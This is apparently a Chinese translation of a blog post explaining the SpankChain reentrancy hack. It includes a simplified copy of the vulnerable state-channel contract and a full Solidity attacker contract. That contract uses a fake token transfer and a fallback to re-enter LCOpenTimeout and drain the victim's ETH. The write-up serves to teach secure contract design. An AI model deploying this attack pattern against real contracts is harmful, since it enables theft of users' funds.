# 痛打一顿

> 原文：<https://medium.com/coinmonks/lashing-out-at-a-spank-channel-2b42b23f0dc6?source=collection_archive---------2----------------------->

![](img/e0f67feb1dfbf6fa5eb546d8a3fb252d.png)

Penny Arcade classic

*或者我多么希望周末能远离电脑。*

上周，一家非常有趣、非常酷的区块链初创公司，绝对值得尊敬，被黑客攻击了。

事实证明，这是一次有用的黑客攻击。该团队不仅从外部审计的重要性中学到了很好的一课，攻击者还在最早的一个[州渠道](https://github.com/jpantunes/awesome-cryptoeconomics#state-channels)合同的 *mainnet* 实现中发现了一个共同的攻击媒介，最终所有相关方都得到了他们的钱(回来)。

关键的发现是，仅仅基于函数签名就相信用户提供的合同地址如预期的那样运行是一个危险的假设。

基于实际的漏洞，我将演示攻击者的代码可能是什么样子，但是将我们需要覆盖的[原始代码](https://etherscan.io/address/0xf91546835f756da0c10cfa0cda95b15577b84aa7#code)的数量减少到最小。

```
pragma solidity 0.4.25;contract HumanStandardToken {
    function transfer(address _to, uint256 _value) public returns (bool success);
}contract SpankChannel { 
    struct Channel {
        address[2] partyAddresses; *// 0: partyA 1: partyI*
        uint256[4] ethBalances; *// 0: balanceA 1:balanceI 2:depositedA 3:depositedI*
        uint256[4] erc20Balances; *// 0: balanceA 1:balanceI 2:depositedA 3:depositedI*
        uint256[2] initialDeposit; *// 0: eth 1: tokens*
        uint256 sequence;
        uint256 confirmTime;
        bytes32 VCrootHash;
        uint256 LCopenTimeout;
        uint256 updateLCtimeout; *// when update LC times out*
        bool isOpen; *// true when both parties have joined*
        bool isUpdateLCSettling;
        uint256 numOpenVC;
        HumanStandardToken token;
    }    
    mapping(bytes32 => Channel) public Channels;

    event DidLCClose (
        bytes32 indexed channelId, 
        uint256 sequence, 
        uint256 ethBalanceA,
        uint256 tokenBalanceA, 
        uint256 ethBalanceI, 
        uint256 tokenBalanceI
    ); function LCOpenTimeout(bytes32 _lcID) public {
        require(msg.sender == Channels[_lcID].partyAddresses[0] 
                && Channels[_lcID].isOpen == false
        );
        require(now > Channels[_lcID].LCopenTimeout);

        if(Channels[_lcID].initialDeposit[0] != 0) {   
            Channels[_lcID].partyAddresses[0].transfer(                        
                            Channels[_lcID].ethBalances[0]
            );
        }
        if(Channels[_lcID].initialDeposit[1] != 0) {
            require(Channels[_lcID].token.transfer(
                            Channels[_lcID].partyAddresses[0], 
                            Channels[_lcID].erc20Balances[0]),
                            "CreateChannel: token transfer failure"
            );
        }
        emit DidLCClose(
            _lcID, 
            0, 
            Channels[_lcID].ethBalances[0],
            Channels[_lcID].erc20Balances[0], 
            0, 
            0
        );
        delete Channels[_lcID];
    }

*// for illustration purposes, simplified attack setup* 
    constructor() public payable {
        *//pre-load the state-channel contract on deployment*
        *//the attack will drain all eth balance from this contract*
    }
    function initAttack(bytes32 _lcID) public {
        Channels[_lcID].partyAddresses[0] = msg.sender;
        Channels[_lcID].token = HumanStandardToken(msg.sender);        
        Channels[_lcID].isOpen = false;
        Channels[_lcID].LCopenTimeout = now - 1 days;
        Channels[_lcID].ethBalances[0] = address(this).balance;           
        Channels[_lcID].initialDeposit[0] = 1 ether;
        Channels[_lcID].initialDeposit[1] = 1 ether; 
        Channels[_lcID].erc20Balances[0] = 1 ether;
    }
}contract Lashing is HumanStandardToken { SpankChannel victim;
    bytes32 public lcID = "A wild reentrancy appears";*// payable fallback* 
    function() public payable {
        if (address(victim).balance >= msg.value)
            attack();
    }
*// ERC20-ish transfer function (same sig, different logic)* 
    function transfer(address _to, uint256 _value) 
        public 
        returns (bool success) 
    {
        if (address(victim).balance >= _value)
            _to.transfer(_value);
            return true;
    }
*// 1 - prime the victim contract* 
    function setup(address _victim) public{
        victim = SpankChannel(_victim);
        victim.initAttack(lcID);
    }
*// 2 - run attack* 
    function attack() public {
        victim.LCOpenTimeout(lcID);
    }
*// 3 - check if attack was success* 
    function getBalances() 
        public 
        view 
        returns(uint256 vicETH , uint256 myETH) 
    {
        return (
            address(victim).balance, 
            address(this).balance
        );
    }
*// 4 - profit!* 
    function withdraw() public {
        msg.sender.transfer(address(this).balance);
    }
}
```

该漏洞存在于`LCOpenTimeout` 功能中。攻击利用恶意的`transfer`功能，在到达`delete Channels[_lcID]`线之前重新进入受害者的合同。攻击者的代码被受害者合同中的`Channels[_lcID].token.transfer`指令调用，并在`Channels[_lcID].partyAddresses[0].transfer(Channels[_lcID].ethBalances[0])`指令上循环，将受害者的所有 ETH 余额转移给攻击者。

没错。这是几年前攻击 DAO 的同一个旧的重新进入错误。聪明的合同开发者需要[纪律](https://www.youtube.com/watch?v=I1ZMKfFHU3U)否则他们会冒偶尔被狠狠揍一顿的风险。

*   免责声明:我在 ICO 期间从这个项目中购买了一些代币，我相信这个项目会成功。

> [直接在您的收件箱中获取最佳软件交易](https://coincodecap.com/?utm_source=coinmonks)

[![](img/7c0b3dfdcbfea594cc0ae7d4f9bf6fcb.png)](https://coincodecap.com/?utm_source=coinmonks)